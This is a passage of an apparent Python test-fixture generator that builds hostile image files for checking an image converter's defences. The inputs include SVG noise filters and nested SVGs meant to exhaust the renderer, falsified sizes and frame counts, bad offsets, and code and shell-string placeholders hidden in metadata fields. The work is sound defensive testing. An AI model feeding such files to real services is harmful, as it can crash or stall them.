trap("noise-a-hundred-million-deep.svg", svg_of('<filter id="f" x="0" y="0" width="1" height="1"><feTurbulence baseFrequency="0.01" numOctaves="100000000"/></filter><rect width="200" height="200" filter="url(#f)"/>', 200, 200),
     "Under 300 bytes, asking for a hundred million layers of noise, each a pass over the whole picture. It would never finish.",
     "svg", group="size", node="fails", note=COSTLY)
trap("three-million-letters.svg", svg_of('<text x="0" y="50" font-size="1">%s</text>' % ("W" * 3_000_000)),
     "One line of three million letters. Setting text slows sharply with its length; eighty thousand took six seconds.",
     "svg", group="size", node="fails", note=COSTLY)
_inner = svg_of('<rect width="100" height="100" fill="red"/>')
for _ in range(25):
    _inner = svg_of('<image width="100" height="100" href="data:image/svg+xml;base64,%s"/>' % _b64.b64encode(_inner).decode())
trap("drawing-in-a-drawing-25-deep.svg", _inner,
     "A drawing that holds a drawing that holds a drawing, twenty-five deep. It ran the renderer out of room and left it unfit for every file after.",
     "svg", group="damage", node="fails", note=COSTLY)


def ico_of(pictures, shared=False, kind=1, size=(16, 16)):
    at = 6 + 16 * len(pictures)
    out = struct.pack("<HHH", 0, kind, len(pictures))
    for data in pictures:
        out += bytes([size[0], size[1], 0, 0, 1, 0, 32, 0]) + struct.pack("<II", len(data), at)
        if not shared:
            at += len(data)
    return out + (pictures[0] if shared else b"".join(pictures))


trap("picture-inside-is-huge.ico", ico_of([big_png(20000, 20000)]),
     "An icon whose list says 16 by 16, which is all a list can say, and whose one picture is 20,000 by 20,000. The converter is told the limit and stops before making room for it.",
     "ico", group="size", node="fails")
trap("twenty-thousand-pictures.pbm", b"P4 1 1\n\0" * 20_000,
     "Twenty thousand pictures of one pixel each, end to end in one file. Its first says 1 by 1, and the rest are never mentioned.",
     "pnm", group="size", node="fails")
trap("comment-ends-the-old-way.pbm", b"P4\n#c\r20000 20000\n1 1\n" + bytes(64),
     "A comment ended with the line break old Macintoshes used. Read as still going on, the size after it is missed and the next two numbers, 1 and 1, are taken for it.",
     "pnm", group="size", guard="refused")
trap("two-widths.pam", b"P7\nWIDTH 1\nHEIGHT 1\nWIDTH 20000\nHEIGHT 20000\nDEPTH 1\nMAXVAL 1\nTUPLTYPE BLACKANDWHITE\nENDHDR\n" + bytes(64),
     "A picture that gives its size twice: 1 by 1, then 20,000 by 20,000. The last one given is the one that counts.",
     "pnm", group="size", guard="refused")
trap("bmi.csv", b"BMI,weight,height\n22.1,70,178\n24.3,81,182\n",
     "A table whose first column is called BMI. Its first two letters are the two that begin a bitmap.",
     "csv", group="identity", node="succeeds")
trap("p1-incidents.md", b"P1 incidents this week\n\n- one\n- two\n",
     'Notes that begin "P1", which is also how the oldest kind of picture file begins.',
     "md", group="identity", node="succeeds")
trap("gif89a.csv", b"GIF89a,b\n1,2\n",
     "A table whose first heading is the six letters every GIF begins with.",
     "csv", group="identity", node="succeeds")
trap("old-header.bmp", b"BM" + struct.pack("<IIII", 74, 0, 26, 12) + struct.pack("<HHHH", 4, 4, 1, 24) + bytes([200]) * 48,
     "A sound bitmap of four pixels by four, with the oldest kind of header. Its size is kept in a different place, and was read as 262,148 by 1,572,865.",
     "bmp", group="unusual", node="succeeds")


# --- Animated PNG ---------------------------------------------------------------------------
# A PNG with more pictures inside it. Each frame after the first is announced by a chunk that
# says where it goes and how long it stays, and its pixels follow in chunks numbered in order.


def fctl(sequence, width, height, x=0, y=0, delay=(1, 10)):
    return chunk(b"fcTL", struct.pack(">IIIIIHHBB", sequence, width, height, x, y, delay[0], delay[1], 0, 0))


def fdat(sequence, raw):
    return chunk(b"fdAT", struct.pack(">I", sequence) + zlib.compress(raw, 9))


def apng_of(frames=2, said=None, width=SMALL_W, height=SMALL_H, second=None, text=b""):
    """A small sound animation: the same picture, `frames` times. `said` is the count it claims."""
    out = SIGNATURE + ihdr(width, height) + chunk(b"acTL", struct.pack(">II", frames if said is None else said, 0)) + text
    out += fctl(0, width, height) + idat(SMALL)
    sequence = 1
    for _ in range(frames - 1):
        out += (second or fctl)(sequence, width, height) + fdat(sequence + 1, SMALL)
        sequence += 2
    return out + IEND


MOVING = apng_of(3)
trap("animation-cut-short.png", MOVING[: len(MOVING) * 2 // 3],
     "An animated PNG cut off in the middle of its second picture. Its first picture is whole, and the first picture is all that is ever read from an animation, so it converts; what was lost was never going to be carried.",
     "apng", group="damage", node="succeeds")
trap("four-billion-frames.png", apng_of(2, said=0xFFFFFFFF),
     "An animation of two pictures that says it has four billion. The count is a claim; the first picture is what is read, and no room is made for the rest.",
     "apng", group="size", node="succeeds")
trap("frame-larger-than-the-picture.png", apng_of(2, second=lambda n, w, h: fctl(n, 60000, 60000)),
     "A second picture that says it is sixty thousand pixels square, in an animation of 64 by 40. Only the first picture is read, at the size the file's own header gives.",
     "apng", group="size", node="succeeds")
trap("animation-named-gif.gif", MOVING,
     "An animated PNG with a .gif name. Both move, and it is the contents that say which this is.",
     "apng", group="identity", mismatch=True, node="succeeds")
trap("frames-out-of-order.png", SIGNATURE + ihdr(SMALL_W, SMALL_H) + chunk(b"acTL", struct.pack(">II", 2, 0)) + fctl(0, SMALL_W, SMALL_H) + idat(SMALL) + fdat(9, SMALL) + fctl(1, SMALL_W, SMALL_H) + IEND,
     "An animation whose second picture comes before the chunk that announces it, numbered out of turn. The first picture is sound, and is what is converted.",
     "apng", group="unusual", node="succeeds")
trap("code.apng", apng_of(2, text=chunk(b"tEXt", b"Comment\x00" + CB) + chunk(b"iTXt", b"XML:com.adobe.xmp\x00\x00\x00\x00\x00" + CB)),
     WHY % "in the comments an animated PNG may carry", "apng", group="code", node="succeeds", absent="omsett_canary")


# --- Cursors, DirectDraw surfaces, FITS and large Photoshop files, all read by ImageMagick ----
for _ext, _label in (("cur", "cursor"), ("dds", "DirectDraw"), ("fits", "FITS"), ("psb", "large Photoshop")):
    _sound = read(_ext, f"sample.{_ext}")
    trap(f"truncated.{_ext}", _sound[: len(_sound) // 2], f"A sound {_label} file cut off halfway through.",
         _ext, node="fails", group="damage", note="This file is damaged: the picture stops partway" if _ext == "psb" else None)

CUR = read("cur", "sample.cur")
_cur = bytearray(CUR)
_cur[18:22] = struct.pack("<I", 0x7FFFFFF0)
trap("bad-offset.cur", bytes(_cur),
     "A cursor whose list points two gigabytes past the end of the file for its picture.",
     "cur", node="fails", group="damage")
trap("picture-inside-is-huge.cur", ico_of([big_png(20000, 20000)], kind=2),
     "A cursor whose list says 16 by 16 and whose one picture is 20,000 by 20,000. The converter is told the limit and stops before making room for it.",
     "cur", group="size", node="fails")
_cur = bytearray(CUR)
_cur[10:14] = struct.pack("<HH", 60000, 60000)
trap("clicks-far-outside.cur", bytes(_cur),
     "A cursor that says the point which does the clicking is sixty thousand pixels away from a picture of 64. That point is never used, so the picture converts.",
     "cur", group="unusual", node="succeeds")
trap("cursor-named-icon.ico", CUR,
     "A cursor with an icon's name. The two differ by one number near the start, and it is that number which says which this is.",
     "cur", group="identity", mismatch=True, node="succeeds")
code("code.cur", ico_of([SIGNATURE + ihdr(SMALL_W, SMALL_H) + chunk(b"tEXt", b"Comment\x00" + CB) + idat(SMALL) + IEND], kind=2, size=(SMALL_W, SMALL_H)),
     WHY % "in the comment of the picture inside a cursor", "cur", node="succeeds", absent="omsett_canary")

DDS = read("dds", "sample.dds")
_dds = bytearray(DDS)
_dds[12:20] = struct.pack("<II", 60000, 60000)
trap("huge-declared.dds", bytes(_dds),
     "A DirectDraw file whose header states 60,000 pixels a side. Refused from the header.",
     "dds", guard="refused", group="size")
_dds = bytearray(DDS)
_dds[28:32] = struct.pack("<I", 0xFFFFFFFF)
trap("four-billion-smaller-copies.dds", bytes(_dds),
     "A DirectDraw file may hold smaller copies of its picture, and says how many. This one says four billion and holds what the sample holds.",
     "dds", group="size", node="succeeds")
_dds = bytearray(DDS)
_dds[4:8] = struct.pack("<I", 4)
trap("header-of-four-bytes.dds", bytes(_dds),
     "A DirectDraw file that says its header is four bytes long. It is always 124, and a file that says otherwise is not taken for one.",
     "unknown", group="identity")
_dds = bytearray(DDS)
_dds[32:76] = (MARK.encode() + bytes(44))[:44]
code("code.dds", bytes(_dds),
     "A DirectDraw file has no place for words, only forty-four spare bytes in its header. Code is written there. Nothing in it may run, and none of it is carried across.",
     "dds", node="succeeds", absent="omsett_canary")


def fits_of(cards, data=b"", end=True):
    """A FITS file: lines of eighty characters, padded to 2880 bytes, then the picture."""
    lines = [("%-8s= %20s" % (key, value)) if key not in ("COMMENT", "HISTORY") else "%-8s%s" % (key, value) for key, value in cards]
    head = "".join(line.ljust(80)[:80] for line in lines + (["END"] if end else [])).encode("latin-1")
    head += b" " * (-len(head) % 2880)
    return head + data + bytes(-len(data) % 2880)


def fits_grey(width, height, extra=(), bits=8, said=None):
    cards = [("SIMPLE", "T"), ("BITPIX", bits), ("NAXIS", 2), ("NAXIS1", (said or (width, height))[0]), ("NAXIS2", (said or (width, height))[1])]
    return fits_of(cards + list(extra), bytes(range(256)) * (width * height * abs(bits) // 8 // 256 + 1))[: None]


trap("huge-declared.fits", fits_grey(16, 16, said=(300000, 300000)),
     "A FITS file whose header states 300,000 pixels a side and holds 256. Refused from the header.",
     "fits", guard="refused", group="size")
trap("size-given-twice.fits", fits_grey(16, 16, extra=[("NAXIS1", 60000), ("NAXIS2", 60000)]),
     "A FITS header that gives its size as 16 by 16 and then, further down, as 60,000 by 60,000. The last one given is the one a reader ends up with, and it is the one checked.",
     "fits", guard="refused", group="size")
trap("header-never-ends.fits", fits_of([("SIMPLE", "T"), ("BITPIX", 8), ("NAXIS", 2), ("NAXIS1", 16), ("NAXIS2", 16)] + [("COMMENT", " still the header")] * 4000, bytes(range(256)), end=False),
     "A FITS header is a list of lines that stops at one saying END. This has four thousand lines and no END.",
     "fits", group="damage", node="fails")
trap("no-picture.fits", fits_of([("SIMPLE", "T"), ("BITPIX", 8), ("NAXIS", 0)]),
     "A FITS file that is sound and holds no picture at all: only a header. That makes it text from its first letter to its last, and a file that is all text is not taken for a picture.",
     "unknown", group="unusual")
trap("a-thousand-pictures.fits", fits_of([("SIMPLE", "T"), ("BITPIX", 8), ("NAXIS", 3), ("NAXIS1", 4), ("NAXIS2", 4), ("NAXIS3", 1000)], bytes(16000)),
     "A FITS file holding a thousand pictures of four pixels each. A file may hold several; past 256 the converter stops counting and refuses.",
     "fits", group="size", node="fails")
trap("bits-that-are-not.fits", fits_grey(16, 16, bits=7),
     "A FITS file that says each pixel takes seven bits. The format allows 8, 16, 32 and 64, and nothing between.",
     "fits", group="damage", node="fails")
trap("words-that-begin-like-fits.fits", ("SIMPLE  =                    T / only somebody's notes\n" + "A line of plain text.\n" * 20).encode(),
     "Plain text whose first line is the one a FITS file opens with. A file that is text all the way through is not a picture, whatever its first line says.",
     "unknown", group="identity")
code("code.fits", fits_grey(16, 16, extra=[("COMMENT", " " + CANARY[:70]), ("HISTORY", " " + MARK), ("COMMENT", " " + SHELL), ("OBJECT", "'%s'" % MARK[:18])]),
     WHY % "in the notes a FITS header carries, cut to the eighty characters a line holds", "fits", node="succeeds", absent="omsett_canary")

PSB = read("psb", "sample.psb")
_psb = bytearray(PSB)
_psb[14:22] = struct.pack(">II", 300000, 300000)
trap("huge-declared.psb", bytes(_psb),
     "A large Photoshop file whose header states 300,000 pixels a side. The format allows it; no browser tab has ninety billion pixels of room. Refused from the header.",
     "psb", guard="refused", group="size")
trap("large-file-named-psd.psd", PSB,
     "A large-document Photoshop file with the ordinary format's name. The two open with the same four letters, and the number after them says which this is.",
     "psb", group="identity", mismatch=True, node="succeeds")
_psb = bytearray(PSB)
_psb[4:6] = struct.pack(">H", 3)
trap("version-three.psd", bytes(_psb),
     "A Photoshop file that says it is version 3. There are only two: 1 is a PSD and 2 is the large format. It is read as neither.",
     "psd", group="damage", node="fails", note="This file is damaged: the file gives a version that does not exist")
_psb = bytearray(PSB)
_psb[30:34] = struct.pack(">I", 0x7FFFFFFF)
trap("notes-longer-than-the-file.psb", bytes(_psb),
     "A large Photoshop file whose section of notes and settings says it is two gigabytes long, in a file of 130 KB. The lengths are added up before the file is read, and this one does not fit.",
     "psb", group="damage", node="fails", note="This file is damaged: a part of the file is longer than the file")
_at = 26 + 4 + struct.unpack(">I", PSB[26:30])[0]
_had = struct.unpack(">I", PSB[_at:_at + 4])[0]
_xmp = b'<x:xmpmeta xmlns:x="adobe:ns:meta/"><dc:description>' + XML_CANARY + b"</dc:description></x:xmpmeta>"
_block = b"8BIM" + struct.pack(">HHI", 0x0424, 0, len(_xmp)) + _xmp + bytes(len(_xmp) % 2)
_block += b"8BIM" + struct.pack(">HHI", 0x03EC, 0, len(CB)) + CB + bytes(len(CB) % 2)
code("code.psb", PSB[:_at] + struct.pack(">I", _had + len(_block)) + _block + PSB[_at + 4:],
     WHY % "in the description and the notes a Photoshop file keeps beside its picture", "psb", node="succeeds", absent="omsett_canary")

with open(os.path.join(OUT, "manifest.json"), "w") as out:
    json.dump(manifest, out, indent=2)
    out.write("\n")
print(f"{len(manifest)} traps written to {OUT}")
